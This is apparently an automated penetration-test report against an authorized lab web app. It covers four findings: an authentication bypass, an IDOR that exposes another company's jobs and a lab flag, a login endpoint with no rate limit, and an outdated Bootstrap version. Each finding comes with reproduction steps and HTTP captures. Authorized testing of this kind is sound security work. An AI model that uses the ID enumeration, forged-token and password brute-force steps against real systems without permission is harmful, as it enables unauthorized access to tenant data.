# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — auth-bypass Unauthenticated access to company job listings (broken access control)](#finding-1)
    - [2. HIGH — idor IDOR / BOLA: any authenticated user can read other companies' jobs at /company/{id}/jobs](#finding-2)
    - [3. LOW — rate-limit No rate limiting or account lockout on authentication endpoint (POST /token)](#finding-3)
    - [4. LOW — vulnerable-component Outdated/End-of-Life Bootstrap 4.5.2 (CSS) — unmaintained, no upstream security support](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyr8db6-vhlydh` |
| Target | http://target.local:8000/ |
| Started | 2026-06-29T05:05:41.222Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 6 mapped · 6 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:8000`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 2 high, 2 low

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [auth-bypass] Unauthenticated access to company job listings (broken access control)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

The protected resource GET /company/{id}/jobs enforces no authentication whatsoever. The login flow (POST /token) issues an HS256 JWT in an HttpOnly cookie and redirects to /company/1/jobs, implying the jobs pages are protected. However, the same content is returned with (a) no session cookie at all, (b) a token with a tampered/garbage signature, and (c) a valid token — all byte-identical. A non-existent company id (99999) returns a distinct empty list, proving the 200 responses are genuine per-company data rather than a catch-all. An unauthenticated attacker can read any company's job listings (and enumerate companies via the path id), exposing tenant business data and demonstrating that the issued JWT is never validated server-side.

**Reproduction**

```
1. GET http://target.local:8000/company/1/jobs with NO Cookie/Authorization header → 200, returns "Jobs for Company 1" with demo's two jobs (610 bytes) — identical to the authenticated response.
2. Repeat with a tampered-signature token (access_token="Bearer <header>.<payload>.GARBAGE") → still 200, same body.
3. Negative control: GET /company/99999/jobs unauthenticated → 200 but an empty job list (420 bytes), confirming responses are content-specific, not a blanket 200.
4. Iterate the path id (1,2,...) unauthenticated to enumerate and read every company's jobs.
```

**Evidence**

- Evidence `ev-mqyrispm-e` — `artifacts/s-0001/ev-mqyrispm-e/`

Request:

```http
GET /company/99999/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 420
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:13:46 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 99999</h2>
<ul class="list-group">
    
</ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrgveq-a` — `artifacts/s-0001/ev-mqyrgveq-a/`

Request:

```http
GET /company/1/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 610
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:12:16 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
    
</ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrhfpk-c` — `artifacts/s-0001/ev-mqyrhfpk-c/`

Request:

```http
GET /company/1/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 610
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:12:42 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
    
</ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqyritde-f` — `artifacts/s-0001/ev-mqyritde-f/`

Request:

```http
GET /company/1/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 610
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:13:47 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 1</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>demo Job 1:demo Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>demo Job 2:demo Job 2 Description</p>
    </li>
    
</ul>

    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [idor] IDOR / BOLA: any authenticated user can read other companies' jobs at /company/{id}/jobs

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

The /company/{id}/jobs endpoint performs no object-level authorization: the path `id` is used directly as a company lookup with no check that it belongs to the requesting user. Authenticated as the `demo` user (company 1), incrementing/altering `id` returns other companies' private job listings. Company 2's listing additionally discloses a secret: `flag{cfbc7583-4a96-4662-835b-81c9f5317b56}`. A non-existent id (99999) returns HTTP 200 with an empty list (no data), confirming the difference between a valid cross-tenant read and a miss is the presence of another tenant's data — i.e. broken object-level access control (BOLA), not merely an enumeration oracle.

**Reproduction**

```
1. Log in as demo (company 1). 2. GET /company/1/jobs → own jobs (demo Job 1/2). 3. GET /company/2/jobs → company2's jobs PLUS "secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}" (HTTP 200, 739 bytes). 4. GET /company/3/jobs → company3's jobs (HTTP 200). 5. Negative control: GET /company/99999/jobs → HTTP 200 but empty list (420 bytes, no jobs). 6. Replaying step 3 twice returns identical cross-tenant data, confirming stable unauthorized access.
```

**Evidence**

- Evidence `ev-mqyrmyv0-t` — `artifacts/s-0002/ev-mqyrmyv0-t/`

Request:

```http
GET /company/99999/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 420
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:17:01 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 99999</h2>
<ul class="list-group">
    
</ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrmxr0-r` — `artifacts/s-0002/ev-mqyrmxr0-r/`

Request:

```http
GET /company/2/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 739
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:17:00 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 2</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>company2 Job 1:company2 Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>company2 Job 2:company2 Job 2 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}</p>
    </li>
    
</ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrng7e-u` — `artifacts/s-0002/ev-mqyrng7e-u/`

Request:

```http
GET /company/2/jobs HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 739
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:17:24 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Jobs</title>
</head>
<body>
    <div class="container">
        
<h2>Jobs for Company 2</h2>
<ul class="list-group">
    
    <li class="list-group-item">
        <p>company2 Job 1:company2 Job 1 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>company2 Job 2:company2 Job 2 Description</p>
    </li>
    
    <li class="list-group-item">
        <p>secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}</p>
    </li>
    
</ul>

    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [rate-limit] No rate limiting or account lockout on authentication endpoint (POST /token)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

POST /token applies no rate limiting, throttling, or account-lockout to failed authentication attempts. Ten consecutive wrong-password submissions for user 'demo' were all accepted for processing and returned HTTP 200 "Incorrect username or password" with no 429, no Retry-After, no progressive delay, and no lockout — including the 8th, 9th, and 10th rapid attempts. The negative control (a malformed request missing both fields) returns a distinct HTTP 422, confirming the server differentiates responses and that a throttling/lockout response would have been observable had one existed. This permits unrestricted online credential brute-forcing and password-spraying against the login.

**Reproduction**

```
1. Rapidly send 10+ POST /token requests (Content-Type application/x-www-form-urlencoded) with body username=demo&password=wrongN (N=1..10), no session.
2. Observe every response is HTTP 200 with the static "Incorrect username or password" page (1046 bytes); no 429, no lockout, no added latency even on the 10th attempt.
3. Negative control: POST /token with body username=&password= → HTTP 422 (validation error), confirming non-200 responses are returned when applicable, so the uniform 200s are not a catch-all.
```

**Evidence**

- Evidence `ev-mqyrf0dc-5` — `artifacts/s-0001/ev-mqyrf0dc-5/`

Request:

```http
POST /token HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=&password=
```

Response:

```http
HTTP/1.1 422
content-length: 174
content-type: application/json
date: Mon, 29 Jun 2026 05:10:49 GMT
server: uvicorn

{"detail":[{"type":"missing","loc":["body","username"],"msg":"Field required","input":null},{"type":"missing","loc":["body","password"],"msg":"Field required","input":null}]}
```

- Evidence `ev-mqyrjyfi-n` — `artifacts/s-0001/ev-mqyrjyfi-n/`

Request:

```http
POST /token HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=demo&password=wrong8
```

Response:

```http
HTTP/1.1 200
content-length: 1046
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:14:40 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>

<div class="alert alert-danger" role="alert">
    Incorrect username or password
</div>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrjzvy-o` — `artifacts/s-0001/ev-mqyrjzvy-o/`

Request:

```http
POST /token HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=demo&password=wrong9
```

Response:

```http
HTTP/1.1 200
content-length: 1046
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:14:43 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>

<div class="alert alert-danger" role="alert">
    Incorrect username or password
</div>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqyrk0t4-p` — `artifacts/s-0001/ev-mqyrk0t4-p/`

Request:

```http
POST /token HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=demo&password=wrong10
```

Response:

```http
HTTP/1.1 200
content-length: 1046
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:14:44 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>

<div class="alert alert-danger" role="alert">
    Incorrect username or password
</div>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [LOW] [vulnerable-component] Outdated/End-of-Life Bootstrap 4.5.2 (CSS) — unmaintained, no upstream security support

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8000/

VERSION-BASED finding (matched by banner, not exploited). The login page loads Bootstrap **4.5.2** from a CDN: `<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">`. Bootstrap 4.x is END-OF-LIFE (the Bootstrap team dropped v4 support in Jan 2023; v5 is current), so it receives no further security fixes.

Practical risk here is LOW: (a) 4.5.2 is already PAST all known Bootstrap-4 XSS CVEs — CVE-2019-8331 (tooltip/popover data-template XSS) was fixed in 4.3.1, and CVE-2018-14040/14041/14042 (collapse/scrollspy/tooltip data-* XSS) were fixed in 4.1.2 — so none of those apply to 4.5.2; and (b) only the Bootstrap *CSS* is loaded (no bootstrap.bundle.js and no jQuery), so the historical JS data-attribute XSS sinks aren't even present on the page. The issue is purely "running an unmaintained EOL frontend dependency," not a known unpatched CVE. No active exploit was attempted — operator should verify and plan an upgrade to a supported Bootstrap 5.x release.

Stack context (assessed, not findings): Server `uvicorn` (no version in banner — cannot CVE-match); FastAPI (confirmed via /openapi.json openapi 3.1.0; no framework version disclosed — cannot CVE-match); Swagger UI 5.9.0 at the public /docs (CDN-pinned, no confident applicable CVE).

**Reproduction**

```
1. GET http://target.local:8000/ and read the HTML <head>. 2. Observe the stylesheet link `https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css` — pins Bootstrap 4.5.2 (an EOL v4 release). Reproduced across two requests (ev-mqys0cd7-1u, ev-mqys0d2b-1v); a non-serving endpoint /openapi.json (ev-mqyrxyco-1t) does not carry the banner, confirming the marker is page-specific, not universal.
```

**Evidence**

- Evidence `ev-mqyrxyco-1t` — `artifacts/_/ev-mqyrxyco-1t/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 2483
content-type: application/json
date: Mon, 29 Jun 2026 05:25:34 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/token":{"post":{"summary":"Login For Access Token","operationId":"login_for_access_token_token_post","requestBody":{"content":{"application/x-www-form-urlencoded":{"schema":{"$ref":"#/components/schemas/Body_login_for_access_token_token_post"}}},"required":true},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/":{"get":{"summary":"Login","operationId":"login__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}}},"/company/{company_id}/jobs":{"get":{"summary":"Show Jobs","operationId":"show_jobs_company__company_id__jobs_get","parameters":[{"name":"company_id","in":"path","required":true,"schema":{"type":"integer","title":"Company Id"}}],"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}}},"components":{"schemas":{"Body_login_for_access_token_token_post":{"properties":{"grant_type":{"anyOf":[{"type":"string","pattern":"password"},{"type":"null"}],"title":"Grant Type"},"username":{"type":"string","title":"Username"},"password":{"type":"string","title":"Password"},"scope":{"type":"string","title":"Scope","default":""},"client_id":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Id"},"client_secret":{"anyOf":[{"type":"string"},{"type":"null"}],"title":"Client Secret"}},"type":"object","required":["username","password"],"title":"Body_login_for_access_token_token_post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```

- Evidence `ev-mqys0cd7-1u` — `artifacts/_/ev-mqys0cd7-1u/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 957
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:25 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
```

- Evidence `ev-mqys0d2b-1v` — `artifacts/_/ev-mqys0d2b-1v/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8000
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 957
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:27:26 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        
<h2>Login</h2>


<p>To try the app you can use the demo account: <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>

<form method="post" action="/token">
    <div class="form-group">
        <label for="username">Company Name</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="password">Password</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-primary">Login</button>
</form>

    </div>
</body>
</html>
```
